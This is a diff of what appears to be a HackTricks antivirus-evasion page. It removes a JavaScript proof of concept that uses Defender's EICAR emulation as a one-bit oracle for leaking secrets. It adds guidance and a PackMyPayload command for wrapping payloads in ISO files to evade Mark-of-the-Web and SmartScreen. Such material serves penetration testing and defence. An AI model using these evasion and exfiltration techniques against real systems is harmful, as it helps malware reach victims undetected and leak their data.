@@ -356,23 +356,56 @@ autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them
 
-## AVOracle – Defender emulation side‑channel (exfiltration)
+## SmartScreen & MoTW
 
-Windows Defender will emulate files that “look like JavaScript.” If the emulated evaluation produces the EICAR signature string, the file is deleted/quarantined. By crafting mixed content where attacker-controlled JS reads unknown content and conditionally appends to the EICAR string, the deletion becomes a 1‑bit oracle that leaks secrets.
+You may have seen this screen when downloading some executables from the internet and executing them.
 
-Minimal PoC concept:
+Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.
 
-```js
-// sample.txt – treated as JS by Defender’s emulator
-var mal = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE";
-// Append '!' only if the first byte of secret matches expectation
-var c = document.body.innerHTML[0] == 'A' ? '!' : '';
-eval(mal + c);
+<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
+
+SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).
+
+**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.
+
+<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>
+
+> [!TIP]
+> It's important to note that executables signed with a **trusted** signing certificate **won't trigger SmartScreen**.
+
+A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.
+
+<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
+
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.
+
+Example usage:
+
+```bash
+PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
+
++      o     +              o   +      o     +              o
+    +             o     +           +             o     +         +
+    o  +           +        +           o  +           +          o
+-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
+   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
+   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
+-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
++      o         o   +       o       +      o         o   +       o
++      o            +      o    ~   Mariusz Banach / mgeeky    o
+o      ~     +           ~          <mb [at] binary-offensive.com>
+    o           +                         o           +           +
+
+[.] Packaging input file to output .iso (iso)...
+Burning file onto ISO:
+    Adding file: /TotallyLegitApp.exe
+
+[+] Generated file written to (size: 3420160): container.iso
 ```
 
-If the condition is true, the emulator sees the full EICAR string and deletes/quarantines the file → signal = 1. Otherwise the file survives → signal = 0. Repeating with different predicates reconstructs the secret data (HTML variant shown above; similar tricks apply to JS on disk).
+Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
 
-Impact: exfiltration of otherwise unreadable secrets via AV behavior. This is a detection evasion concern too (security tooling affecting integrity). See reference for full details and variations.
+<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
 ## ETW
 
@@ -872,6 +905,5 @@ References for PPL and tooling
 - [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 - [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
 - [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
-- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
 
 {{#include ../banners/hacktricks-training.md}}
